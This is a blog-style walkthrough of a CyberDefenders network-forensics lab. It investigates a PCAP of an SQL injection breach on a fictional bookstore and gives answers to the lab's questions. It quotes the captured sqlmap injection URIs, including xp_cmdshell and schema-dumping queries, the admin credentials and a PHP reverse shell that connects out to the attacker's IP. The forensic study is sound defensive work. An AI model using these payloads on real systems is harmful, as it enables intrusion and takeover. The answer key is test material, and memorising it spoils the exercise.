---
title: Web Investigation
date: 2024-09-03 00:00:00 -500
categories: [DFIR, Network Forensics]
tags: [CyberDefenders]
---


# Scenario:

You are a cybersecurity analyst working in the Security Operations Center (SOC) of BookWorld, an expansive online bookstore renowned for its vast selection of literature. BookWorld prides itself on providing a seamless and secure shopping experience for book enthusiasts around the globe. Recently, you've been tasked with reinforcing the company's cybersecurity posture, monitoring network traffic, and ensuring that the digital environment remains safe from threats.

Late one evening, an automated alert is triggered by an unusual spike in database queries and server resource usage, indicating potential malicious activity. This anomaly raises concerns about the integrity of BookWorld's customer data and internal systems, prompting an immediate and thorough investigation.  

As the lead analyst on this case, you are required to analyze the network traffic to uncover the nature of the suspicious activity. Your objectives include:
```c
- Identifying the attack vector, 
- Assessing the scope of any potential data breach, and 
- Determining if the attacker gained further access to BookWorld''s internal systems  
```


# Tools:

- Wireshark
- Network Miner

# Tags:

```c
[PCAP](https://cyberdefenders.org/blueteam-ctf-challenges/?tags=pcap)
[Wireshark](https://cyberdefenders.org/blueteam-ctf-challenges/?tags=wireshark)
[NetworkMiner](https://cyberdefenders.org/blueteam-ctf-challenges/?tags=networkminer)
[SQL](https://cyberdefenders.org/blueteam-ctf-challenges/?tags=sql)
```


# Question:

- Q1: By knowing the attacker's IP, we can analyze all logs and actions related to that IP and
```c
- Determine the extent of the attack, 
- The duration of the attack, and 
- The techniques used 
```


Can you provide the attacker's IP?

Going to `Conversations`:
![](/assets/img/Pasted image 20240724215040.png)

	- This Ip address is have so much connections on IP address 73.124.22.88.


Why would this be the case?
- `73.124.22.88` is the target with the URL of `bookworldstore.com`

![](/assets/img/Pasted image 20240724215438.png)

	- The attacker used these tools:
		- SQLMap : for finding SQLi
		- Gobuster : used for directory enumeration
		- Cobalt Strike : as seen above, for C2 comms and directory enumeration

-> Answer: `111.224.250.131`


- Q2: If the geographical origin of an IP address is known to be from a region that has no business or expected traffic with our network, this can be an indicator of a targeted attack. Can you determine the origin city of the attacker?

![](/assets/img/Pasted image 20240724215801.png)

	- I dont have maxmind db plugin installed.

-> Answer: `Shijiazhuangg`

Other information:
```c
Country: China
AS Number: 4134
AS Organization: Chinanet
Latitude: 38.036 deg
Longitude: 114.465 deg
```


- Q3: Identifying the exploited script allows security teams to understand exactly which vulnerability was used in the attack. This knowledge is critical for finding the appropriate patch or workaround to close the security gap and prevent future exploitation. Can you provide the vulnerable script name?

From the previous questions, we figured out that the tools used by the attacker are:
```c
- Gobuster -> Recon
- SQLMap -> Recon + Exploitation
- Meterpreter or Cobalt Strike -> Post-exploitation
```

At this stage of the chain, it is most likely that we have to find the script coming from `SQLMap`. Since that is the case, most SQL Injection exists in the URL. Let's filter all those packets:
![](/assets/img/Pasted image 20240724222608.png)

Its not this:
![](/assets/img/Pasted image 20240724222701.png)

Let's look further:
![](/assets/img/Pasted image 20240724222746.png)

	- Nope, this is for image files.


- Changing the Wireshark filter:
```c
http.user_agent contains "sql"
```

![](/assets/img/Pasted image 20240724223351.png)


-> Answer: `search.php`

- Q4: Establishing the timeline of an attack, starting from the initial exploitation attempt, What's the complete request URI of the ***first*** SQLi attempt by the attacker?

First SQLi attempt with `SQLMap`:
```c
/search.php?search=book&ZscL=7696%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
```

Converted to human-readable URL encoding:
```php
/search.php?search=book&ZscL=7696 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
```

Vulnerabilities:
```c
- XSS : 
- Local file inclusion : 'cat ../../../etc/passwd'
- Command execution inside the SQL database and gets reflected on the web server
```

-> Answer: 
```php
/search.php?search=book&ZscL=7696 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
```


- Q5: Can you provide the complete request URI that was used to read the web server available databases?

For this question, its better to look at the requests made on the webserver:
![](/assets/img/Pasted image 20240724225703.png)

	- Then select 'Request'

Possibly helpful query:
```c
http.user_agent contains "sql" && http.request.full_uri contains "DBMS"
```

IP Source:
```c
73.124.22.98
```


IP Destination:
```c
111.224.250.131
```

```c
http.response_number == 200
```

Full query: effective as it returns the response for most of the SQL queries from SQLmap! (Way to find the sqlmap commands that has useful responses)
```c
ip.src == 73.124.22.98 && ip.dst == 111.224.250.131 && http.response.code == 200
```

Other findings:
`(a)` List of books:
![](/assets/img/Pasted image 20240725121321.png)

`(b)` Not sure what exactly is the output for this one:
![](/assets/img/Pasted image 20240725121535.png)

![](/assets/img/Pasted image 20240725121616.png)

![](/assets/img/Pasted image 20240725121638.png)


`(c)` Found the sql query!:
![](/assets/img/Pasted image 20240725121829.png)



-> Answer: `http://bookworldstore.com/search.php?search=book%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7178766271%2CJSON_ARRAYAGG%28CONCAT_WS%280x7a76676a636b%2Cschema_name%29%29%2C0x7176706a71%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA--%20-`


- Q6: Assessing the impact of the breach and data access is crucial, including the potential harm to the organization's reputation. What's the ***table*** name containing the website users data?

![](/assets/img/Pasted image 20240725122006.png)

-> Answer: `customers`

`=>` More findings on table **customers**:
![](/assets/img/Pasted image 20240725122245.png)

```c
Columns inside table 'customers':
- int
- password
- username
```


`=>` Credential found `admin:admin123!`: I'd say, this was found on the table '**admin**'
![](/assets/img/Pasted image 20240725122415.png)


![](/assets/img/Pasted image 20240725122717.png)


Following the stream:
![](/assets/img/Pasted image 20240725123222.png)


PIIs leaked:
```c
Addresses found and associated email + First and Last name of user + Number(?not sure on this one):
- 123 Maple Street <-> john.doe1234@gmail.com <-> John Doe <-> 555-1234
- 456 Oak Avenue <-> jane.smith5678@gmail.com <-> Jane Smith <-> 555-5678
- 789 Pine Road <-> emily.johnson91011@gmail.com <-> Emily Johnson <-> 555-9012
- 321 Birch Boulevard <-> michael.brown1213@gmail.com <-> Michael Brown <-> 555-3456
- 654 Willow Way <-> sarah.davis1415@gmail.com <-> Sarah Davis <-> 555-6789
- 987 Cedar St. <-> william.wilson1617@gmail.com <-> William Wilson <-> 555-1011
- 345 Spruce Ave. <-> jessica.moore1819@gmail.com <-> Jessica Moore <-> 555-1213
- 678 Pine St. <-> david.taylor2021@gmail.com <-> David Taylor <-> 555-1415
- 901 Maple Dr. <-> linda.anderson2223@gmail.com <-> Linda Anderson <-> 555-1617
- 123 Oak Lane <-> james.thomas2425@gmail.com <-> James Thomas <-> 555-1819
```


From table `books`:
![](/assets/img/Pasted image 20240725123822.png)

Following this stream:
![](/assets/img/Pasted image 20240725123851.png)

List of books:
```c
- The Great Gatsby
- 1984
- To Kill a Mockingbird
- Lolita
- Jane Eyre
- Brave New World
- Wuthering Heights
- Animal Farm
- Les Mis..rables
- Sense and Sensibility
- Anna Karenina
- Dracula
- Madame Bovary
- The Picture of Dorian Gray
- A Tale of Two Cities
- Frankenstein
- Hamlet
- The Catcher in the Rye
- The Hobbit
- Crime and Punishment
- Great Expectations
- The Adventures of Huckleberry Finn
- The Lord of the Rings
```




- Q7: The website directories hidden from the public could serve as an ***unauthorized access point*** or contain sensitive functionalities not intended for public access. Can you provide name of the directory discovered by the attacker?

Start of admin login attempt:
![](/assets/img/Pasted image 20240725124208.png)

First failed login attempt:
![](/assets/img/Pasted image 20240725124259.png)


First successful login attempt:
![](/assets/img/Pasted image 20240725124415.png)


-> Answer: `/admin/`


- Q8: Knowing which credentials were used allows us to determine the extent of account compromise. What's the credentials used by the attacker for logging in?

Checking which credentials was used for this by following the stream:
![](/assets/img/Pasted image 20240725124538.png)


-> Answer: `admin:admin123!`


- Q9: We need to determine if the attacker gained further access or control on our web server. What's the name of the malicious script uploaded by the attacker?

There's a single packet for this one:
![](/assets/img/Pasted image 20240724221404.png)

	- Let's apply the filter by right-clicking + Apply as filter

Digging into this packet:
![](/assets/img/Pasted image 20240724221645.png)

	- It seems to be the packet related to file upload 'NVri2vhp.php' which contains this code:

```c
<?php 
exec("/bin/ bash -c 'bash-i >& /dev/tcp"111.224.250.131"/443 0>&1'");
?>
```

	- This is a reverse shell script so when executed on the webserver, it connects back to the attacker's machine on its port 443 via TCP (HTTPS basically).


Execution of the uploaded file:
![](/assets/img/Pasted image 20240725125521.png)


- This shows that the webserver has a file upload vulnerability. Consult the OWASP for patching.

-> Answer: `NVri2vhp.php`


# Conclusion:

```c
1) Identifying the attack vector:
	- SQL Injection on the webserver''s external facing website on the script 'search.php'
2) Assessing the scope of any potential data breach, and 
	- All data on the webserver''s database is compromised including all of its databases and tables contained. From the user''s perspective, all PIIs are compromised.
3) Determining if the attacker gained further access to BookWorld''s internal systems:
	- The attacker not only gained access on the database but also managed to get the administrative credentials from it leading to the file upload vulnerability in the website leading to reverse shell on the web server itself.
```
